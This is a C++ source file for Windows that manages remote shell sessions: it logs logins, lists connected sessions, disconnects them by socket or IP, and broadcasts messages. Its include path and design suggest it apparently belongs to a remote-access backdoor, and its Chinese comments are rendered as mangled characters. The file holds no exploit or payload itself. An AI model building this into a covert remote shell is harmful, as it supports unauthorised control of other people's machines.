#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <list>
#include "..\zxsCommon\SocketList.h"

using namespace std;

class SHELLLOG:public C_SOCKETLIST//shell �Ự
{
private:
	C_SOCKETLIST s_incmd;//��¼����ִ��һЩ�����socket�����ܷ���Ϣ��ȥ
public:
	void push_socket_incmd(SOCKET s);
	void erase_socket_incmd(SOCKET s);
	bool b_socket_incmd(SOCKET s);

	int ListShellOnline(SOCKET Socket);
	int KillClientBySocket(SOCKET Socket, SOCKET s);
	int KillClientByIP(SOCKET Socket, char *szIP);
	int SendMsgToSession(SOCKET Socket, char *Session, char *szMsg);
	int SendMsgToClient(char *szMsg, int len);

};

struct LOGINFO
{
	BOOL bLogin;
	char szIP[32];
	SYSTEMTIME st;
};

class LOGINNED:public LINKTABLE<LOGINFO>//shell �ĵ�½��¼
{
protected:
	CRITICAL_SECTION cs;
public:
	LOGINNED()
	{
		InitializeCriticalSection(&cs);
	}
	~LOGINNED()
	{
		DeleteCriticalSection(&cs);
	}
	int AddRecord(SOCKET s, BOOL bLogin);
	int ListRecord(SOCKET Socket);

};

int LOGINNED::AddRecord(SOCKET s, BOOL bLogin)
{
	EnterCriticalSection(&cs);

	LOGINFO li;
	memset(&li, 0, sizeof(LOGINFO));
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	if(getpeername(s, (SOCKADDR *)&clientaddr, &addrlen) == 0)
		strcpy(li.szIP, inet_ntoa(clientaddr.sin_addr));
	else
		strcpy(li.szIP, "unknown");

	GetLocalTime(&li.st);
	li.bLogin = bLogin;

	int ret = Add(li);

	LeaveCriticalSection(&cs);
	return ret;
}

int LOGINNED::ListRecord(SOCKET Socket)
{
	int ret = 0;
	char szTemp[128];
	int len;

	_Node<LOGINFO> *curr = Head;
	EnterCriticalSection(&cs);

	for(int n=0; n<Count; n++)
	{
		len = GetDateFormat(MAKELCID(MAKELANGID(LANG_ENGLISH,SORT_DEFAULT),SORT_DEFAULT),
			0, &curr->data.st, "ddd, dd MMM yyyy ", szTemp, sizeof(szTemp));
		sprintf(szTemp+len-1, "%02u:%02u:%02u GMT", curr->data.st.wHour, curr->data.st.wMinute, curr->data.st.wSecond);
		SendMessage(Socket, "%d\t%s\tIP:%s %s\r\n", ret, szTemp, curr->data.szIP, curr->data.bLogin?"Login Succeed":"Login Failed");
		curr = curr->Next;
		ret++;
	}
	LeaveCriticalSection(&cs);

	return ret;
}
/////////////////////////////////////////

inline void SHELLLOG::push_socket_incmd(SOCKET s)
{
	s_incmd.AddSocket(s);
}

inline void SHELLLOG::erase_socket_incmd(SOCKET s)
{
	s_incmd.DelSocket(s);
}

inline bool SHELLLOG::b_socket_incmd(SOCKET s)
{
	return s_incmd.IsSocketInList(s);
}

inline int SHELLLOG::KillClientBySocket(SOCKET Socket, SOCKET s)
{
	if(Socket == s)
	{
		SendMessage(Socket, "You can't kill yourself.\r\n");
		return 0;
	}

	linger lg = {1, 1};
	int iMode = 0;

	int ret = 0;
	_Node<SOCKET> *curr = Head;
	EnterCriticalSection(&cs);

	for(int n=0; n<Count; n++)
	{
		//NO.  IP  SOCKET
		if(curr->data == s)
		{
			ret++;
			setsockopt(s, SOL_SOCKET, SO_LINGER,
				(const char FAR *)&lg, sizeof(lg));
			ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);
			//closesocket(s);
			shutdown(s, 0x02);//SD_BOTH
			break;
		}
		curr = curr->Next;
	}
	LeaveCriticalSection(&cs);
	if(ret)
		SendMessage(Socket, "Socket: %d session closed.\r\n", s);
	else
		SendMessage(Socket, "Socket: %d not found.\r\n", s);
	return ret;
}

inline int SHELLLOG::KillClientByIP(SOCKET Socket, char *szIP)
{
	linger lg = {1, 0};
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	DWORD dwIP = inet_addr(szIP);
	if(dwIP == INADDR_NONE)
	{
		SendMessage(Socket, "%s does not a legitimate IP.\r\n", szIP);
		return 0;
	}
	if(getpeername(Socket, (SOCKADDR *)&clientaddr, &addrlen) == 0)
	{
		if(clientaddr.sin_addr.S_un.S_addr == dwIP)
		{
			SendMessage(Socket, "You can't kill yourself.\r\n");
			return 0;
		}
	}

	int ret = 0;
	_Node<SOCKET> *curr = Head;
	EnterCriticalSection(&cs);

	for(int n=0; n<Count; n++)
	{
		if(getpeername(curr->data, (SOCKADDR *)&clientaddr, &addrlen) == 0)
		{
			if(clientaddr.sin_addr.S_un.S_addr == dwIP)
			{
				ret++;
				setsockopt(curr->data, SOL_SOCKET, SO_LINGER,
					(const char FAR *)&lg, sizeof(lg));
				shutdown(curr->data, 0x02);//SD_BOTH
			}
		}
		curr = curr->Next;
	}
	LeaveCriticalSection(&cs);
	if(ret)
		SendMessage(Socket, "%d sessions in total closed.\r\n", ret);
	else
		SendMessage(Socket, "%s not found.\r\n", szIP);
	return ret;
}

inline int SHELLLOG::SendMsgToSession(SOCKET Socket, char *Session, char *szMsg)
{
	SOCKET s;
	if(!stricmp(Session, "*"))
		s = 0;
	else
		s = (SOCKET)(atoi(Session));

	int ret = 0;
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	getpeername(Socket, (SOCKADDR *)&clientaddr, &addrlen);

	_Node<SOCKET> *curr = Head;
	EnterCriticalSection(&cs);

	for(int n=0; n<Count; n++)
	{
		if(! b_socket_incmd(curr->data))
		{
			if(s == 0)
			{
				ret++;
				SendMessage(curr->data, "\r\nMessage from %s:%d:\r\n%s\r\n", inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port), szMsg);
			}else
			{
				if(curr->data == s)
				{
					ret++;
					SendMessage(curr->data, "\r\nMessage from %s:%d:\r\n%s\r\n", inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port), szMsg);
					break;
				}
			}
		}
		curr = curr->Next;
	}
	LeaveCriticalSection(&cs);
	if(ret)
		SendMessage(Socket, "Message Send over.\r\n", s);
	else
		SendMessage(Socket, "Socket: %d not found.\r\n", s);
	return ret;
}

inline int SHELLLOG::ListShellOnline(SOCKET Socket)
{
	int ret = 0;
	_Node<SOCKET> *curr = Head;
	EnterCriticalSection(&cs);

	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);

	SendMessage(Socket, "NO.  IP              Port   Socket\r\n"); 
	for(int n=0; n<Count; n++)
	{
		//NO.  IP  SOCKET

		if(getpeername(curr->data, (SOCKADDR *)&clientaddr, &addrlen) == 0)
		{
			SendMessage(Socket, "%-4d %-15s %-6d %-4d %s\r\n", 
				ret, inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port), curr->data, curr->data==Socket?"*":"");
			ret++;
		}

		curr = curr->Next;
	}
	LeaveCriticalSection(&cs);
	SendMessage(Socket, "%d sessions in total listed.\r\n", ret);
	return ret;
}

inline int SHELLLOG::SendMsgToClient(char *szMsg, int len)
{
	int ret = 0;
	_Node<SOCKET> *curr = Head;
	EnterCriticalSection(&cs);

	for(int n=0; n<Count; n++)
	{
		if(! b_socket_incmd(curr->data))
		{
			SendMessage(curr->data, "\r\n%s>", LocalHostName);
			DataSend(curr->data, szMsg, len);
			ret++;
		}
		curr = curr->Next;
	}
	LeaveCriticalSection(&cs);
	return ret;
}
